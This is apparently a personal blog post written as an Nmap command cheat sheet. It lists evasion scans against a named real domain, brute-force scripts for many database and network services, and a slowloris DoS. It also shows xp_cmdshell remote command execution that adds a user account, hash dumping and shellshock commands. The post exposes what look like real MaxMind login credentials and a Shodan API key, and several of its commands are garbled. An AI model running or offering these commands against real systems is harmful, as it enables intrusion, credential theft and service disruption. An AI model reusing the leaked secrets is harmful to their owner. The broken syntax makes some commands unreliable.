---
title: Nmap
encrypt: false
enc_pwd: askding
categories:
  - Tools
date: 2020-12-07 20:08:51
top:
tags:
layout:
---



[Nmap服务列表](https://svn.nmap.org/nmap/nmap-services)

## Nmap常用扫描案例

`指定网络接口 -e eth0`
使用nmap 绕过防火墙
1 碎片扫描

```zsh
root@kali:~# nmap -f m.anzhi.com

root@kali:~# nmap -mtu 8 m.anzhi.com
2 诱饵扫描

root@kali:~# nmap -D RND:10 m.anzhi.com

root@kali:~# nmap –D decoy1,decoy2,decoy3 m.anzhi.com
3 僵尸扫描
root@kali:~# nmap 192.168.8.0/24 --script=ipidseq   #探测僵尸主机
root@kali:~# nmap -P0 -sI zombie m.anzhi.com
4 随机数据长度

root@kali:~# nmap --data-length 25 m.anzhi.com

root@kali:~# nmap --randomize-hosts 103.17.40.69-100

root@kali:~# nmap -sl 211.211.211.211m.anzhi.com

5 欺骗扫描
root@kali:~# nmap --sT -PN --spoof-mac 0 m.anzhi.com
root@kali:~# nmap --badsum m.anzhi.com

root@kali:~# nmap -g 80 -S www.baidu.com m.anzhi.com

root@kali:~# nmap -p80 --script http-methods --script-args http.useragent=”Mozilla 5”m.anzhi.com

```


### 探测CVE漏洞
```bash
cd /usr/share/nmap/scripts/
##git clone https://github.com/vulnersCom/nmap-vulners.git
wget https://raw.githubusercontent.com/vulnersCom/nmap-vulners/master/vulners.nse
git clone https://github.com/scipag/vulscan.git
cd vulscan/utilities/updater
chmod +x updateFiles.sh | ./updateFiles.sh

nmap --script nmap-vulners，vulscan --script-args vulscandb = scipvuldb.csv -sV <Target>


#banner-plus
$ wget https://raw.githubusercontent.com/hdm/scan-tools/master/nse/banner-plus.nse
# for MacOS
$ cp banner-plus.nse /usr/local/share/nmap/scripts/
# for Linux
$ cp banner-plus.nse /usr/share/nmap/scripts/

```


使用代理，加脚本
```zsh
nmap --script "not intrusive" <ip>  --proxy socks4://127.0.0.1:18080 

```
查找开放端口
```zsh
 cat file.txt| grep "\d/" | cut  -f1 -d "/"
```
```zsh
 ( cat file.txt| grep "\d/" | cut  -f1 -d "/" | tr "
" "," ) >/var/tmp/aa.tx
```






## Nmap

### NSE脚本搜索
```zsh
    bing/baidu/google:
                intext: nsedoc/scripts <script_name> 
    nmap --script-help <script-name>
```

### 查看脚本数量
```zsh
ls /usr/local/Cellar/nmap/7.80_1/share/nmap/scripts | wc -l
```
### 更新NSE
```zsh
    nmap --script-updatedb

代理扫描
nmap -sV -Pn -n --proxies socks4://127.0.0.1:9050 scanme.nmap.org
```
### IP地址定位
####  ip-geolocation-maxmind
下载[Maxmind'GeoLite City](https://www.maxmind.com/en/accounts/249487/geoip/downloads)
email:nichola.null     password:XtTSHkEGkfbB6st
```zsh
cp GeoLite2-City_20200317.tar.gz  /usr/share/nmap/nselib/data
tar -zxvf GeoLite2-City_20200317.tar.gz
nmap --script ip-geolocation-maxmind <target> [--script-args ip-geolocation.maxmind_db=<filename>]
```
#### ipinfodb
获取[API](https://ipinfodb.com/register)

```zsh
nmap --script ip-geolocation-ipinfodb <target> --script-args ip-geolocation-ipinfodb.apikey=<API_key>
```
### 获取Whois记录
```zsh
nmap --script "whois-*" --script-args whodb=nocache target 
```
### 从Shodan获取目标信息
```zsh
vi /usr/local/Cellar/nmap/7.80_1/share/nmap/scripts/shodan-api.nse
set local apiKey = "7VYpw5QnxgWeww59w7sX7jD6up7Qth9a"
 nmap  -sn -Pn -n --script shodan-api  --script-args 'shodan-api.outfile=potato.csv' x.y.z.0/24
```
### 探测WAF
```zsh
nmap --script "http-waf-*" <target>
```
### 探测代理
```zsh
nmap --script http-open-proxy <target>
```
### 目录探测
```zsh
nmap --script http-enum <target>    目录探测
nmap --script http-userdir-enum <target> 用户名探测    

```
### 扫描XSS
```zsh
nmap -p80 --script http-unsafe-output-escaping,http-xssed,http-phpself-xss <target>
```
### 扫描SQL注入
```zsh
nmap -p80 --script http-sql-injection <target>
```
### DoS攻击
```zsh
nmap -p80 --script http-slowloris --max-parallelism 400 <target>
```
### shellshock
```zsh
nmap -sV --script http-shellshock <target>
nmap -sV --script http-shellshock --script-args cmd=ls <target>
```

### git目录
```zsh
nmap -p80 --script http-git <target>
nmap -p443 --script http-svn-info <target>
```
### SSL
```zsh
nmap -p443 --script ssl* <target>
```

### 扫描HeartBleed漏洞
```zsh
    nmap  -sV  -p -sV 443  -sV  –script ssl-heartbleed –script-args vulns.showall <target>
```

### 扫描SNMP服务
```zsh
    nmap -sU  -sV  -p -sV 161 --script snmp-brute [--script-args snmp-brute.communitiesdb=<wordlist> ]<target>
```

### 扫描DHCP服务
```zsh
    nmap -sU -sV  -p -sV 67 --script=dhcp-discover 192.168.1.0/24
```
### 扫描Daytime服务
```zsh
    nmap -sV  -p -sV 13 --script=daytime <target>
```

### 扫描NTP服务
```zsh
    nmap -sU -sV  -p -sV 123 --script ntp-info <target>
```

### 扫描LLTD服务
```zsh
    nmap script lltd-discovery --script-args=lltd-discovery.interface=en0,netwtargets=<target>
```

### 扫描NetBIOS服务
```zsh
    nmap -sV  -p -sV 137 -sU --script nbstat <target>
```


### 扫描苹果AFP服务
```zsh
    nmap -sV  -p -sV 548 --script=afp-serverinfo <target> [--script-args=afp.password=password,afp.username=username]
```

### 扫描DAAP服务
```zsh
    nmap -sV  -p -sV 3689 --script=daap-get-library <target> [--script-args daap_item_limit=number]
```

### 扫描NFS服务
```zsh
    nmap -sV  -p -sV 111 --script nfs-ls,nfs-showmount <target>
```

### 扫描AJP服务
```zsh
    nmap -sV  -p -sV 8009 --script ajp-* <target> [--script-args=ajp-auth.path=/login]
```

### 2.9.2. 扫描ASP.NET服务
```zsh
    nmap -sV  -p -sV 80 --script=http-aspnet-debug  [--script-args=http-aspnet-debug.path=path] <target>
```

### 扫描HTTP认证服务
```zsh
    nmap -sV  -p -sV 80 --script http-auth [--script-args=http-auth.path=/login] <host>
```

### 扫描SSL服务
```zsh
    nmap -sV  -p -sV 443 --script ssl-*,sslv2-sV  -p -sV,tls-alpn,tls-nextprotoneg <host>
```


### Memcache数据库
```zsh
    nmap -sV -p11211 --script memcached-info <host>
```
### 扫描DB2数据库
```zsh
    nmap --script broacast-db2-discover ,db2-das-info <host>
```

### 扫描SQL Server服务
```zsh
     获取mssql信息                        # nmap -p 1433 --script ms-sql-info.nse --script-args mssql.instance-port=1433 -v 192.168.3.0/24
    扫描mssql sa空密码                    # nmap -p 1433 --script ms-sql-empty-password.nse -v 192.168.3.0/24
     sa弱口令爆破                         # nmap -p 1433 --script ms-sql-brute.nse -v 192.168.3.0/24
     利用xp_cmdshell,远程执行系统命令       # nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=sa,ms-sql-xp-cmdshell.cmd=net user test test add 192.168.3.0/24
    导出mssql中所有的数据库用户及密码hash        # nmap -p 1433 --script ms-sql-dump-hashes -v 192.168.3.0/24
```

### 扫描Cassandra服务
```zsh
    nmap -sV  -p -sV 9160 --script cassandra-info <host>
```
### 扫描MongoDB相关服务
```zsh
 尝试爆破mongdb                     # nmap -p 27017  --script mongodb-brute 192.168.3.0/24
验证mongodb未访问授权               # nmap -p27017  —script mongodb-info  192.168.3.0/24
```
### 扫描Informix服务
```zsh
     nmap -p 9088 --script informix-brute.nse 192.168.3.23
```


### 扫描CouchDB服务
```zsh
    nmap -sV  -p -sV 5984 --script "couchdb-*" <host>
```

### 扫Redis服务
```zsh
redis爆破                        # nmap -p 6379 --script redis-brute.nse 192.168.3.0/24
redis未访问授权                   # nmap -p6379 —-script redis-info 192.168.3.0/24
```

###  扫描MySQL服务
```zsh
    mysql-info                       ·# nmap -sV  -p -sV 3306 --script mysql-info <host>
    mysql 扫描root空密码                # nmap -p 3306 --script mysql-empty-password.nse -v <host>
    mysql root弱口令简单爆破             # nmap -p 3306 --script mysql-brute.nse -v <host>
    导出mysql中所有用户的hash            # nmap -p 3306 --script mysql-dump-hashes --script-args='username=root,password=root’ <host> 
    Mysql身份认证漏洞                    # nmap -p 3306 --script mysql-vuln-cve2012-2122.nse  -v <host>

```
### 扫描memcached服务
```zsh
验证Memcached未授权访问漏洞        # nmap -sV -p11211 —script memcached-info 192.168.1.2/24
```
### 扫描PostgreSQL服务
```zsh
尝试爆破postgresql                # nmap -p 5432 --script pgsql-brute -v 192.168.3.0/24
```

### 扫描Oracle服务
```zsh
                   nmap -sV  -p -sV 1521 --script =oracle-tns-version <host>
 尝试爆破oracle     # nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=ORCL -v 192.168.3.0/24
                  # nmap --script oracle-brute-stealth -p 1521 --script-args oracle-brute-stealth.sid=ORCL  -v 192.168.3.0/24

```


### 扫描RDP服务
```zsh
    nmap -sV  -p -sV 3389 --script rdp-enum-encryption <host>
```

### 扫描SSH服务
```zsh
    nmap   -p 22-sV  --script ssh2-enum-algos <host>
```

### 扫描VMware服务
```zsh
    nmap -sV  -p -sV 443 --script vmware-version <host>
```

### 扫描VNC服务
```zsh
    nmap -sV  -p -sV 5900 --script "vnc-*" <host>
```


### 扫描IMAP服务
```zsh
    nmap -sV  -p -sV 143 --script="imap-*" <host>
```

### 扫描POP3服务
```zsh
    nmap -sV  -p -sV 110,995 --script pop-3-ntlm-info <host>
```

### 扫描SMTP服务
```zsh
    nmap -sV  -p -sV 25 --script smtp-ntlm-info <host>
```


### 字典DICT服务
```zsh
    nmap -sV  -p -sV 2628 --script dict-info <host>
```

###  扫描IRC服务
```zsh
    nmap -sV  -p -sV 6667 --script irc-info <host>
```

### 扫描硬盘监测服务
```zsh
    nmap -sV  -p -sV 7634 --script hddtemp-info <host>
```

### 扫描Rsync服务
```zsh
  rsync未授权访问  nmap -sV  -p -sV —-script rsync-brute —-script-args ‘rsync-brute.module=www’ <target>
```

### 扫描Elasticsearch服务
```zsh
验证Elasticsearch未访问授权    # nmap —-script http-vuln-cve2015-1427 —-script-args command=‘ls’  192.168.3.0/24 
```

### MS12-020
```zsh
    nmap -sV  -p3389 --script rdp-vuln-ms12-020 <host>
```


# 参考
[精通Nmap脚本引擎](https://t0data.gitbooks.io/nmap-nse/content/)
[CVE漏洞检测](https://blog.bbskali.cn/index.php/archives/1324/)